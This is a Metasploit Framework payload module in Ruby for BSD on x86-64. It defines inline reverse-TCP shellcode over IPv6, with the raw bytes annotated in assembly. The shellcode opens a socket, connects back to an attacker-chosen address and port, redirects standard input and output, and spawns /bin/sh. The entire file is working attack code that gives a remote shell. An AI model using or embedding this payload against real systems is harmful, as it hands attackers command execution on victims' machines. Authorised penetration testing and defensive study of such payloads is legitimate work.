##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 105

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD x64 Command Shell, Reverse TCP Inline (IPv6)',
      'Description'   => 'Connect back to attacker and spawn a command shell over IPv6',
      'Author'        => 'Balazs Bucsay @xoreipeip <balazs.bucsay[-at-]rycon[-dot-]hu>',
      'References'    => ['URL', 'https://github.com/earthquake/shellcodes/blob/master/x86_64_bsd_ipv6_reverse_tcp.asm.c'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'LHOST'    => [ 85, 'ADDR6' ],
              'LPORT'    => [ 79, 'n' ],
              'SCOPEID'  => [ 101,  'V' ]
            },
          'Payload' =>
            "\x6a\x61"             + #  	pushq  $0x61                       #
            "\x58"                 + #  	pop    %rax                        #
            "\x99"                 + #  	cltd                               #
            "\x6a\x1c"             + #  	pushq  $0x1c                       #
            "\x5f"                 + #  	pop    %rdi                        #
            "\x6a\x01"             + #   pushq  $0x1                        #
            "\x5e"                 + #  	pop    %rsi                        #
            "\x0f\x05"             + #   syscall                            #
            "\x48\x97"             + #   xchg   %rax,%rdi                   #
            "\x04\x3e"             + #   add    $0x3e,%al                   #
            "\x0f\x05"             + #   syscall                            #
            "\xff\xc6"             + #   inc    %esi                        #
            "\x04\x59"             + #   add    $0x59,%al                   #
            "\x0f\x05"             + #  	syscall                            #
            "\xff\xce"             + #  	dec    %esi                        #
            "\xff\xce"             + #   dec    %esi                        #
            "\x04\x58"             + #   add    $0x58,%al                   #
            "\x0f\x05"             + #   syscall                            #
            "\xe9\x23\x00\x00\x00" + #   jmpq   <forth>                     #
            # back:
            "\x5e"                 + #   pop    %rsi                        #
            "\x6a\x1c"             + #   pushq  $0x1c                       #
            "\x5a"                 + #  	pop    %rdx                        #
            "\x66\x83\xc0\x62"     + #   add    $0x62,%ax                   #
            "\x0f\x05"             + #   syscall                            #
            "\x99"                 + #  	cltd                               #
            "\x52"                 + #  	push   %rdx                        #
            "\x48\xbf\x2f\x2f\x62" + #   mov "//b"                          #
            "\x69\x6e\x2f\x73\x68" + #  	"in/sh",%rdi                       #
            "\x57"                 + #  	push   %rdi                        #
            "\x48\x89\xe7"         + #   mov    %rsp,%rdi                   #
            "\x52"                 + #  	push   %rdx                        #
            "\x57"                 + #  	push   %rdi                        #
            "\x48\x89\xe6"         + #   mov    %rsp,%rsi                   #
            "\x04\x3b"             + #   add    $0x3b,%al                   #
            "\x0f\x05"             + # 	syscall                            #
            # forth:
            "\xe8\xd8\xff\xff\xff" + #   callq <back>                       #
            # sockaddr_in6
            "\x00\x1c\x11\x5c"     + #   AF_INET6+port                      #
            "\x00\x00\x00\x00"     + #   no-one-cares                       #
            "\x00\x00\x00\x00"     + #   IPv6-                              #
            "\x00\x00\x00\x00"     + #   addr-                              #
            "\x00\x00\x00\x00"     + #   in-                                #
            "\x00\x00\x00\x01"     + #   16 bytes                           #
            "\x00\x00\x00\x00"      #   Scope ID                           #
        }
      ))
      register_options([
         OptInt.new('SCOPEID', [false, "IPv6 scope ID, for link-local addresses", 0])
      ])
  end
end
